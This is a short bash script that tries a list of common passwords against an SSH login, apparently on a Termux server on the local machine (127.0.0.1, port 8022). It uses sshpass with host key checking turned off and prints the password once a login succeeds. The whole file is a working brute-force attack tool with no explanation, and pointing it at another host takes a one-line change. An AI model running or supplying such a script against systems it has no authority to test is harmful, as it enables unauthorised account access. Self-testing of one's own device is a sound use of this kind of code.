USER="u0_a447"
HOST="127.0.0.1"
PORT="8022"
for pw in 123456 password admin 12345 qwerty letmein courage harare; do
  echo "[*] Trying: $pw"
  sshpass -p "$pw" ssh -p $PORT -o StrictHostKeyChecking=no -o ConnectTimeout=3 $USER@$HOST "echo SUCCESS" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo ""
    echo "[+] CRACKED! Password is: $pw"
    exit 0
  fi
done
echo ""
echo "[-] No password found - SECURE!"
